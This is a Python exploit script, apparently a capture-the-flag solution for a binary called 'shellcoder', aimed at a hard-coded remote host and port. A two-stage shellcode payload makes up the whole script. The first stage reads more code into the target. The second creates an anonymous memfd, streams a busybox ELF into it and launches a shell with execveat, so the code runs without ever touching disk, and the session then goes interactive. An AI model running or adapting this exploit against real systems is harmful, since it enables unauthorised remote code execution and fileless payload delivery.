#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './shellcoder'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'139.180.215.222', 'port':20002})
env.select()

constants.SYS_memfd_create  = 319
constants.SYS_execveat      = 322
constants.AT_EMPTY_PATH     = 0x1000

#==========

binf = ELF(bin_file)

#==========

def attack(conn, **kwargs):
    shellasm = '''
    xchg rdi, rsi
    mov dh, 0x10
    syscall 
    '''

    conn.sendafter(':', asm(shellasm))

    elf = open('/bin/busybox').read()
    # elf = open('a.out').read()
    elf_size = (len(elf) + 0xfff) & ~0xfff

    block_size = 0x100

    shellasm  = 'mov r13, rsi'
    shellasm += shellcraft.alarm(0)
    shellasm += shellcraft.syscall(constants.SYS_memfd_create, 'rsi', 0)
    shellasm += 'mov r12, rax'
    shellasm += shellcraft.ftruncate('r12', elf_size)
    shellasm += shellcraft.mmap(0xdead0000, elf_size, constants.PROT_READ | constants.PROT_WRITE, constants.MAP_SHARED, 'r12', 0)
    shellasm += '''
    mov rsi, 0xdead0000
    loop:
    '''
    shellasm += shellcraft.read(constants.STDIN_FILENO, None, block_size)
    shellasm += '''
    add rsi, rax
    cmp rax, {}
    je loop
    push 0x6873
    mov rax, rsp
    push 0
    push rax
    '''.format(block_size)
    shellasm += shellcraft.syscall(constants.SYS_execveat, 'r12', 'r13', 'rsp', 0, constants.AT_EMPTY_PATH)
    shellasm += shellcraft.infloop()
    
    # shellasm += shellcraft.msync(0xdead0000, elf_size, 0)
    # shellasm += shellcraft.lseek('r12', 0, constants.SEEK_SET)

    conn.send('\x00'*7 + asm(shellasm))
    sleep(0.5)
    for s in [elf[i: i+block_size] for i in range(0, len(elf), block_size)]:
        conn.send(s)

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
